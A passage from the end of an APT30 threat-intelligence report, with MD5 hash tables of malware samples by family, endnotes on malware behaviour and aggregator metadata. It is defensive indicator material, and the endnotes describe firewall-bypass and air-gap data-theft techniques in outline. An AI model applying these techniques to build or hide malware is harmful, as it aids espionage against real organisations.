Family|\n|---|---|\n|002e27938c9390a942cf4b4c319f1768|BACKSPACE|\n|062fe1336459a851bd0ea271bb2afe35|BACKSPACE|\n|09010917cd00dc8ddd21aeb066877aa2|BACKSPACE|\n|0fcb4ffe2eb391421ec876286c9ddb6c|BACKSPACE|\n|12e1dcd71693b6f875a98aefbd4ec91a|BACKSPACE|\n|1f64afa4069036513604cbf651e53e0d|BACKSPACE|\n|29395c528693b69233c1c12bef8a64b3|BACKSPACE|\n|37e568bed4ae057e548439dc811b4d3a|BACKSPACE|\n|40f47850c5ebf768fd1303a32310c73e|BACKSPACE|\n|414854a9b40f7757ed7bfc6a1b01250f|BACKSPACE|\n|428fc53c84e921ac518e54a5d055f54a|BACKSPACE|\n|4c10a1efed25b828e4785d9526507fbc|BACKSPACE|\n|4c6b21e98ca03e0ef0910e07cef45dac|BACKSPACE|\n|4e5c116d874bbaaf7d6dadec7be926f5|BACKSPACE|\n|550459b31d8dabaad1923565b7e50242|BACKSPACE|\n|59e055cee87d8faf6f701293e5830b5a|BACKSPACE|\n|5ae51243647b7d03a5cb20dccbc0d561|BACKSPACE|\n|5b590798da581c894d8a87964763aa8b|BACKSPACE|\n|62e5d5e244059dc02654f497401615cc|BACKSPACE|\n|65232a8d555d7c4f7bc0d7c5da08c593|BACKSPACE|\n|853a20f5fc6d16202828df132c41a061|BACKSPACE|\n|95bfe940816a89f168cacbc340eb4a5f|BACKSPACE|\n|9c0cad1560cd0ffe2aa570621ef7d0a0|BACKSPACE|\n|a5ca2c5b4d8c0c1bc93570ed13dcab1a|BACKSPACE|\n|a9e8e402a7ee459e4896d0ba83543684|BACKSPACE|\n|acb2ba25ef225d820ac8a5923b746cb8|BACKSPACE|\n\n\n-----\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware Family|\n|---|---|\n|b2138a57f723326eda5a26d2dec56851|BACKSPACE|\n|b590c15499448639c2748ff9e0d214b2|BACKSPACE|\n|b7b282c9e3eca888cbdb5a856e07e8bd|BACKSPACE|\n|ba80e3ad617e6998f3c4b003397db840|BACKSPACE|\n|c95cd106c1fecbd500f4b97566d8dc96|BACKSPACE|\n|d38e02eac7e3b299b46ff2607dd0f288|BACKSPACE|\n|d8e68db503f4155ed1aeba95d1f5e3e4|BACKSPACE|\n|d93026b1c6c828d0905a0868e4cbc55f|BACKSPACE|\n|db3e5c2f2ce07c2d3fa38d6fc1ceb854|BACKSPACE|\n|df1799845b51300b03072c6569ab96d5|BACKSPACE|\n|e26a2afaaddfb09d9ede505c6f1cc4e3|BACKSPACE|\n|e3ae3cbc024e39121c87d73e87bb2210|BACKSPACE|\n|e62a63307deead5c9fcca6b9a2d51fb0|BACKSPACE|\n|ec3905d8e100644ae96ad9b51d701a7f|BACKSPACE|\n|ed151602dea80f39173c2f7b1dd58e06|BACKSPACE|\n|07bb30a2a42423e54f70af61e20edca3|BACKSPACE|\n|08f299c2d8cfe1ae64d71dfb15fe6e8d|BACKSPACE|\n|139158fe63a0e46639cc20b754a7c38c|BACKSPACE|\n|4a41c422e9eb29f5d722700b060bca11|BACKSPACE|\n|646e2cfa6aa457013769e2b89454acf7|BACKSPACE|\n|948a53450e1d7dc7535ea52ca7d5bddd|BACKSPACE|\n|a2e0203e665976a13cdffb4416917250|BACKSPACE|\n|ad044dc0e2e1eaa19cf031dbcff9d770|BACKSPACE|\n|af1c1c5d8031c4942630b6a10270d8f4|BACKSPACE|\n|c6e388ee5269239070e5ad7336d0bf59|BACKSPACE|\n|c9484902c7f1756b26244d6d644c9dd5|BACKSPACE|\n\n\n-----\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware Family|\n|---|---|\n|cc06815e8d8c0083263651877decb44b|BACKSPACE|\n|dc95b0e8ecb22ad607fc912219a640c1|BACKSPACE|\n|f97ec83d68362e4dff4756ed1101fea8|BACKSPACE|\n|572c9cd4388699347c0b2edb7c6f5e25|BACKSPACE|\n|6e689351d94389ac6fdc341b859c7f6f|BACKSPACE|\n|b5546842e08950bc17a438d785b5a019|BACKSPACE|\n|010ca5e1de980f5f45f9d82027e1606c|BACKSPACE|\n|0570066887f44bc6c82ebe033cad0451|BACKSPACE|\n|0a4fdacde69a566f53833500a0d53a35|BACKSPACE|\n|1133fe501fa4691b7f52e53706c80df9|BACKSPACE|\n|2a2b22aa94a59575ca1dea8dd489d2eb|BACKSPACE|\n|2d75de9e1bb58fe61fd971bb720a49b7|BACKSPACE|\n|40601cf29c1bbfe0942d1ac914d8ce27|BACKSPACE|\n|44992068aab25daa1decae93b25060af|BACKSPACE|\n|49ee6365618b2a5819d36a48131e280c|BACKSPACE|\n|4b8531d294c020d5f856b58a5a23b238|BACKSPACE|\n|4ee00c46da143ba70f7e6270960823be|BACKSPACE|\n|5ddbd80720997f7a8ff53396e8e8b920|BACKSPACE|\n|65b984b198359003a5a3b8aaf91af234|BACKSPACE|\n|6791254f160e98ac1f46b4d506b695ad|BACKSPACE|\n|7b111e1054b6b929de071c4f48386415|BACKSPACE|\n|8022a4136a6200580962da94f3cdb905|BACKSPACE|\n|8214b0e18fbcd5db6b008884e7685f2c|BACKSPACE|\n|8da9373fc5b8320fb04d6202ca1eb6f1|BACKSPACE|\n|9c31551cd8087072d08c9004c0ce76c5|BACKSPACE|\n\n\n-----\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware Family|\n|---|---|\n|9cbcc68c9b913a5fda445fbc7558c658|BACKSPACE|\n|9e3ef98abcfffcf3205261e09e06cba6|BACKSPACE|\n|ab153afbfbcfc8c67cf055b0111f0003|BACKSPACE|\n|c90f798ccfbedb4bbe6c4568e0f05b68|BACKSPACE|\n|cb1087b2add3245418257d648ac9e9a7|BACKSPACE|\n|cd1aa1c8cdf4a4ba8dc4309ce30ec263|BACKSPACE|\n|d55514d8b97999453621a8614090cbf0|BACKSPACE|\n|d8248be5ed0f2f8f9787be331a18c36b|BACKSPACE|\n|da92b863095ee730aef6c6c541ab7697|BACKSPACE|\n|f4a648a2382c51ca367be87d05628cff|BACKSPACE|\n|ff00682b0b8c8d13b797d722d9048ea2|BACKSPACE|\n|0cdc35ffc222a714ee138b57d29c8749|BACKSPACE|\n|10aa368899774463a355f1397e6e5151|BACKSPACE|\n|3166baffecccd0934bdc657c01491094|BACKSPACE|\n|d28d67b4397b7ce1508d10bf3054ffe5|BACKSPACE|\n|310a4a62ba3765cbf8e8bbb9f324c503|BACKSPACE|\n|23813c5bf6a7af322b40bd2fd94bd42e|BACKSPACE|\n|6508ee27afe517aa846f9447faef59b8|BACKSPACE|\n|78c4fcee5b7fdbabf3b9941225d95166|BACKSPACE|\n|8c713117af4ca6bbd69292a78069e75b|BACKSPACE|\n|8c9db773d387bf9b3f2b6a532e4c937c|BACKSPACE|\n|ebf42e8b532e2f3b19046b028b5dfb23|BACKSPACE|\n|fe211c7a081c1dac46e3935f7c614549|BACKSPACE|\n|6f931c15789d234881be8ae8ccfe33f4|BACKSPACE|\n|1dbb584e19499e26398fb0a7aa2a01b7|BACKSPACE|\n|37aee58655f5859e60ece6b249107b87|BACKSPACE|\n\n\n-----\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware Family|\n|---|---|\n|4154548e1f8e9e7eb39d48a4cd75bcd1|BACKSPACE|\n|71f25831681c19ea17b2f2a84a41bbfb|BACKSPACE|\n|8ff473bedbcc77df2c49a91167b1abeb|BACKSPACE|\n|a813eba27b2166620bd75029cc1f04b0|BACKSPACE|\n|b4ae0004094b37a40978ef06f311a75e|BACKSPACE|\n|c4dec6d69d8035d481e4f2c86f580e81|BACKSPACE|\n|021e134c48cd9ce9eaf6a1c105197e5d|NETEAGLE (Scout)|\n|5eaf3deaaf2efac92c73ada82a651afe|NETEAGLE (Scout)|\n|7c307ca84f922674049c0c43ca09bec1|NETEAGLE (Scout)|\n|b8617302180d331e197cc0433fc5023d|NETEAGLE (Scout)|\n|e6289e7f9f26be692cbe6f335a706014|NETEAGLE (Scout)|\n|95bb314fe8fdbe4df31a6d23b0d378bc|NETEAGLE (Norton)|\n|d97aace631d6f089595f5ce177f54a39|NETEAGLE (Norton)|\n|0c4fcef3b583d0ffffc2b14b9297d3a4|SHIPSHAPE|\n|1612b392d6145bfb0c43f8a48d78c75f|SHIPSHAPE|\n|168d207d0599ed0bb5bcfca3b3e7a9d3|SHIPSHAPE|\n|1e6ee89fddcf23132ee12802337add61|SHIPSHAPE|\n|42ccbccf48fe1cb63a81c9f094465ae2|SHIPSHAPE|\n|4f00235b5208c128440c5693b7b85366|SHIPSHAPE|\n|53f1358cbc298da96ec56e9a08851b4b|SHIPSHAPE|\n|5dd625af837e164dd2084b1f44a45808|SHIPSHAPE|\n|9e27277ef0b6b25ccb2bb79dbf7554a7|SHIPSHAPE|\n|b249bcf741e076f11b6c9553f6104f16|SHIPSHAPE|\n|bbb3cb030686748b1244276e15085153|SHIPSHAPE|\n|c2acc9fc9b0f050ec2103d3ba9cb11c0|SHIPSHAPE|\n|e39756bc99ee1b05e5ee92a1cdd5faf4|SHIPSHAPE|\n\n\n-----\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware Family|\n|---|---|\n|f18be055fae2490221c926e2ad55ab11|SHIPSHAPE|\n|01d2383152795e4ec98b874cd585da30|SPACESHIP|\n|08b54f9b2b3fb19e388d390d278f3e44|SPACESHIP|\n|11876eaadeac34527c28f4ddfadd1e8d|SPACESHIP|\n|28f2396a1e306d05519b97a3a46ee925|SPACESHIP|\n|80e39b656f9a77503fa3e6b7dd123ee3|SPACESHIP|\n|8e2eee994cd1922e82dea58705cc9631|SPACESHIP|\n|b6c08fd8a9f32a17c3550d3b2d302dc5|SPACESHIP|\n|c4c068200ad8033a0f0cf28507b51842|SPACESHIP|\n|d591dc11ecffdfaf1626c1055417a50d|SPACESHIP|\n|e9e514f8b1561011b4f034263c33a890|SPACESHIP|\n|1b81b80ff0edf57da2440456d516cc90|FLASHFLOOD|\n|5d4f2871fd1818527ebd65b0ff930a77|FLASHFLOOD|\n|74b87086887e0c67ffb035069b195ac7|FLASHFLOOD|\n|af670600dee2bf13a68eb962cce8f122|FLASHFLOOD|\n|b5a343d11e1f7340de99118ce9fc1bbb|FLASHFLOOD|\n|fad06d7b4450c4631302264486611ec3|FLASHFLOOD|\n|49aca228674651cba776be727bdb7e60|MILKMAID|\n|5c7a6b3d1b85fad17333e02608844703|MILKMAID|\n|649fa64127fef1305ba141dd58fb83a5|MILKMAID|\n|9982fd829c0048c8f89620691316763a|MILKMAID|\n|baff5262ae01a9217b10fcd5dad9d1d5|MILKMAID|\n|b249bcf741e076f11b6c9553f6104f16|SHIPSHAPE|\n|bbb3cb030686748b1244276e15085153|SHIPSHAPE|\n|c2acc9fc9b0f050ec2103d3ba9cb11c0|SHIPSHAPE|\n|e39756bc99ee1b05e5ee92a1cdd5faf4|SHIPSHAPE|\n\n\n-----\n\nBelow are md5 hash values for a representative sample of APT30 malware.\n\n|MD5 Hash|Malware Family|\n|---|---|\n|592381dfa14e61bce089cd00c9b118ae|ORANGEADE|\n|b493ad490b691b8732983dcca8ea8b6f|ORANGEADE|\n|b83d43e3b2f0b0a0e5cc047ef258c2cb|ORANGEADE|\n|35dfb55f419f476a54241f46e624a1a4|CREAMSICLE|\n|4fffcbdd4804f6952e0daf2d67507946|CREAMSICLE|\n|597805832d45d522c4882f21db800ecf|CREAMSICLE|\n|6bd422d56e85024e67cc12207e330984|CREAMSICLE|\n|82e13f3031130bd9d567c46a9c71ef2b|CREAMSICLE|\n|b79d87ff6de654130da95c73f66c15fa|CREAMSICLE|\n|44b98f22155f420af4528d17bb4a5ec8|BACKBEND|\n|6ba315275561d99b1eb8fc614ff0b2b3|BACKBEND|\n|ee1b23c97f809151805792f8778ead74|BACKBEND|\n|bf8616bbed6d804a3dea09b230c2ab0c|GEMCUTTER|\n\n\n-----\n\n###### APPENDIX C   ENDNOTES\n\n|1|While binary compile times can be modified or faked, we believe that compile dates for APT30 malware are reliable. Given several hundred malware samples, the compile dates show a fairly regular distribution over the years 2005 – present. In addition, registration dates for the earliest known APT30 domains also support origins dating back to the same time frame.|\n|---|---|\n|2|We were able to verify that each file’s icon type (Adobe or Word) was consistent with the letter used (p or w). Although we were only able to identify one malicious document used to deploy a ZRLnk variant (md5 hash d2661543c3c456f5fafdd97e31aaff17), the document type (an RTF file, typically opened by Microsoft Word) was also consistent with the version convention.|\n|3|We did not have conclusive data to interpret the meaning of the last character ‘N’ and ‘Y’, present in some samples. Some evidence suggests that it may represent the inclusion or exclusion of additional malware features, such as the ability to bypass personal firewalls; this appears to be true for at least one variant of BACKSPACE (“Zj Listen”).|\n|4|The use of mutexes and events also supports version control, ensuring that the newer version of the malware executed during the self-update process replaces the previous version.|\n|5|See Appendix A for a detailed description of BACKSPACE malware.|\n|6|While the controller software refers to itself as “NetEagle,” it is used to manage backdoor clients for the malware we call BACKSPACE (also known as “Lecna”). The malware we call NETEAGLE uses a different set of commands and is not compatible with the “NetEagle” controller. In an attempt to avoid confusion, we will refer to the controller as the “BACKSPACE controller,” since it is used to manage BACKSPACE clients.|\n|7|This aligns with early BACKSPACE compile dates of 2005.|\n|8|BACKSPACE samples with md5 hash values acb2ba25ef225d820ac8a5923b746cb8 and c90f798ccfbedb4bbe6c4568e0f05b68 are two examples.|\n|9|Additional paths with slight variations have also been observed in FLASHFLOOD, such as %WINDIR%\\$NtUninstallKB885884$.|\n|10|A controller that could be freely copied and distributed would erode the market for future custom software purchases.|\n|11|See Appendix for detailed analysis of both BACKSPACE and NETEAGLE.|\n|12|For example, the BACKSPACE B and Y commands; see Appendix for details.|\n|13|See Appendix for detailed analysis.|\n|14|http://www.asean.org/asean/about-asean|\n|15|http://www.asean.org/news/item/eighteenth-asean-summit-jakarta-7-8-may-2011|\n|16|http://www.asean.org/news/asean-statement-communiques/item/joint-statement-the-seventh-asean-plus-three-labour- ministers-meeting-7th-almm3-phnom-penh-11-may-2012|\n|17|http://maritimesecurity.asia/free-2/asean-2/asean-china-talk-on-east-sea/|\n|18|http://www.aseanindia.com/summit-2012/|\n|19|http://en.wikipedia.org/wiki/List_of_Secretaries-General_of_the_Association_of_Southeast_Asian_Nations|\n|20|http://www.asean.org/news/asean-secretariat-news/item/asean-today-2|\n|21|For the “ZJ Listen” variants, the “Y” vs. “N” in the version number appears to differentiate between variants that attempt to bypass certain host-based firewalls by generating mouse-click events on dialog box buttons. The “Y” variants include this feature; the “N” variants do not.|\n\n\n-----\n\n|22|The paths %WINDIR%\\$NtUninstallKB900727$ and %WINDIR%\\$NtUninstallKB885884$ are used by some variants of the FLASHFLOOD malware, one of three components believed to be used to steal data from air-gapped networks.|\n|---|---|\n|23|Two outliers were compiled in May 2011; those samples also used the aseanm.com C2 domain and may have been created to target the 18th ASEAN Summit.|\n|24|CSIDL (constant special item ID list) values are used to identify frequently used folders that may not have the same path on different Windows systems. CSIDL_TEMPLATES corresponds to the folder used to store document templates; for example, C:\\Documents and Settings\\<username>\\Templates. See https://msdn.microsoft.com/en-us/desktop/ bb762494%28v=vs.85%29.aspx for additional detail.|\n|25|The threat actor can provide a target IP address or hostname with the ‘(‘ command.|\n|26|Most “ZJ Listen” samples were compiled on December 31, 2012 and share similar version numbers with the “ZJ Link” samples from April 2013 (e.g., version strings containing Lan2.2Lnk for “ZJ Listen” and F2.2Lnk or F2.3Lnk for “ZJ Link”).|\n|27|http://www.mfa.gov.bt/wp-content/uploads/2013/08/press-release11.pdf|\n|28|Shear, Michael. “White House Urges China to Act on Journalists’ Visas”. Jan 30, 2014. http://www.nytimes. com/2014/01/31/world/asia/white-house-urges-china-to-act-on-journalists-visas.html|\n|29|BACKSPACE is also known as “Lecna” and may be detected by security vendors by either name – e.g., Backdoor.APT.Lecna.|\n|30|Comparison is generalized; individual samples may vary.|\n|31|The hex representation of each ASCII character is incremented by one. ‘M’ (0x4D) becomes ‘N’ (0x4E), ‘.’ (0x2E) becomes ‘/’ (0x2F), etc.|\n|32|https://msdn.microsoft.com/en-us/library/windows/desktop/aa365740%28v=vs.85%29.aspx|\n|33|Analysis of other BACKSPACE variants suggests that the firewall bypass features may be a modular capability that can be compiled into different versions at will. Preliminary analysis suggests that version numbers for some BACKSPACE variants may include a “Y” or an “N” to indicate the presence or absence of this feature.|\n|34|Version information is the OSVERSIONINFO struct data returned by a call to GetVersionEx.|\n|35|Analysis of other versions of BACKSPACE showed that Port3 may be used for an interactive remote command shell, but that function was not supported in sample 6ee35da59f92f71e757d4d5b964ecf00.|\n|36|https://msdn.microsoft.com/en-us/library/windows/desktop/aa365740%28v=vs.85%29.aspx|\n|37|Due to limited availability of products localized for languages like Thai, Tagalog, or others used in the Southeast Asia region, English and Chinese would likely be the most common versions used by organizations in that area.|\n|38|The ‘W’ is overwritten by the malware version string. The version string is 5 bytes including the NULL character. It appears the beacon was intended to have a 4 byte version string. When copying the 2.18\\x00, the last \\x00 overwrites the ‘W’ character.|\n|39|Persistence may be provided by other files used to retrieve or install NETEAGLE; for example, the MILKMAID/ ORANGEADE droppers create a shortcut file to establish persistence for a second-stage file downloaded by their CREAMSICLE payloads.|\n|40|It is possible that this behavior is configured within the binary at compile time, or has been otherwise modified in this version.|\n|41|SHIPSHAPE determines the disk size by TotalNumberOfBytes returned from GetDiskFreeSpace. The return value is typically the size of the drive or, if quotas are enabled, the value is the size of the quota.|\n\n\n-----\n\n|42|Because the copied executables are external to the SHIPSHAPE malware, their content or purpose is unknown. FireEye believes that SHIPSHAPE may be used to copy tools such as SPACESHIP, which could then be transferred (via the removable drive) to another victim computer.|\n|---|---|\n|43|The sample f18be055fae2490221c926e2ad55ab11, described here, targets folders and .doc/.docx files, although the sample b249bcf741e076f11b6c9553f6104f16 contains icons for a much broader range of file types within its resource section.|\n|44|These are believed to be directories used by other pieces of the malware ecosystem. The SPACESHIP sample analyzed below references both the \\msdn\\ and \\Recycled\\ directories on a removable drive; the FLASHFLOOD sample references \\$LDDATA$\\ and \\Recycled\\.|\n|45|Info.txt is used as a log file where information associated with scanning and file information is kept.|\n|46|Likely an updated configuration file. Note the missing \\ in the directory path between FoxPro and ld.ini.)|\n|47|The purpose of this activity is unclear. SENS (the System Event Notification Service) can be used to support mobile computers or computers on high-latency networks. See https://msdn.microsoft.com/en-us/library/windows/desktop/ cc185680%28v=vs.85%29.aspx.|\n|48|See https://msdn.microsoft.com/en-us/library/ms629649%28v=vs.85%29.aspx.|\n|49|See https://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx.|\n|50|FLASHFLOOD determines the disk size using the TotalNumberOfBytes returned from GetDiskFreeSpace. The return value is typically the size of the drive or, if quotas are enabled, the value is the size of the quota.|\n|51|Presumably files in these directories were already archived, e.g., when copied to the drive by SPACESHIP.|\n|52|The file “China MFA Press Briefing 29October 2012.doc” (md5 hash f054c0f8c5b4c2a5eb30a16ebe09d8d0) is an example of an exploit document that drops ORANGEADE and the DLL variant of CREAMSICLE.|\n|53|<CSIDL_STARTUP> is a file system directory that corresponds to the user's Startup program group; for example, C:\\Documents and Settings\\[user]\\Start Menu\\Programs\\Startup under Windows XP or C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup under Vista/Windows 7.|\n|54|Netsvc.exe is presumably an updated backdoor, downloaded if the BACKSPACE mutexes are not found on the victim host.|\n|55|Netsvc.exe is presumably an updated backdoor, downloaded if the BACKSPACE mutex is not found on the victim host.|\n\n\n-----\n\n###### To download this or other\n\n FireEye Threat Intelligence reports,\n\n visit: www.fireeye.com/reports\n\n\nFireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com\n\n© 2015 FireEye, Inc. All rights reserved. FireEye is a registered trademark of\nFireEye, Inc. All other brands, products, or service names are or may be trademarks\nor service marks of their respective owners. SP.SYR.EN-US.022015\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/05/20081935/rpt-apt30.pdf",
        "https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf"
    ],
    "report_names": [
        "rpt-apt30.pdf"
    ],
    "threat_actors": [
        {
            "id": "caf95a6f-2705-4293-9ee1-6b7ed9d9eb4c",
            "created_at": "2022-10-25T15:50:23.472432Z",
            "updated_at": "2025-03-27T02:00:55.479021Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [
                "Confucius",
                "Confucius APT"
            ],
            "source_name": "MITRE:Confucius",
            "tools": [
                "WarzoneRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a9ee8219-1882-4b1b-bac8-641b1603787d",
            "created_at": "2022-10-25T15:50:23.78263Z",
            "updated_at": "2025-03-27T02:00:55.545647Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "APT30"
            ],
            "source_name": "MITRE:APT30",
            "tools": [
                "SHIPSHAPE",
                "FLASHFLOOD",
                "NETEAGLE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7a8dbc5e-51a8-437a-8540-7dcb1cc110b8",
            "created_at": "2022-10-25T16:07:23.482856Z",
            "updated_at": "2025-03-27T02:02:09.827887Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [],
            "source_name": "ETDA:Confucius",
            "tools": [
                "ApacheStealer",
                "ByeByeShell",
                "ChatSpy",
                "Confucius",
                "MY24",
                "Sneepy",
                "remote-access-c3",
                "sctrls",
                "sip_telephone",
                "swissknife2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "30ed778d-15b3-484e-a90b-e1e05b36a42f",
            "created_at": "2023-01-06T13:46:38.290626Z",
            "updated_at": "2025-03-27T02:00:02.795711Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "G0013"
            ],
            "source_name": "MISPGALAXY:APT30",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ad154227-6fcf-43c5-a540-0c09534e040f",
            "created_at": "2024-05-01T02:03:07.952927Z",
            "updated_at": "2025-03-27T02:05:17.267077Z",
            "deleted_at": null,
            "main_name": "BRONZE GENEVA",
            "aliases": [
                "BRONZE STERLING ",
                "CTG-5326 ",
                "Naikon ",
                "Override Panda ",
                "APT30 "
            ],
            "source_name": "Secureworks:BRONZE GENEVA",
            "tools": [
                " ShadowPad",
                "Lecna"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "360f51f5-8a80-41d6-92c4-9aa042cd2732",
            "created_at": "2022-10-25T16:07:23.34569Z",
            "updated_at": "2025-03-27T02:02:09.746944Z",
            "deleted_at": null,
            "main_name": "APT 30",
            "aliases": [
                "APT 30",
                "Bronze Geneva",
                "Bronze Sterling",
                "CTG-5326",
                "Override Panda",
                "RADIUM",
                "Raspberry Typhoon"
            ],
            "source_name": "ETDA:APT 30",
            "tools": [
                "BackBend",
                "Creamsicle",
                "Flashflood",
                "Gemcutter",
                "Lecna",
                "NetEagle",
                "Neteagle_Scout",
                "Orangeade",
                "ScoutEagle",
                "Shipshape",
                "ZRLnk",
                "norton"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041803,
    "ts_creation_date": 1429100190,
    "ts_modification_date": 1429100204,
    "files": {
        "pdf": "https://archive.orkl.eu/55ea4075414a961a79bf62c7c55008322dc8ee4e.pdf",
        "text": "https://archive.orkl.eu/55ea4075414a961a79bf62c7c55008322dc8ee4e.txt",
        "img": "https://archive.orkl.eu/55ea4075414a961a79bf62c7c55008322dc8ee4e.jpg"
    }
}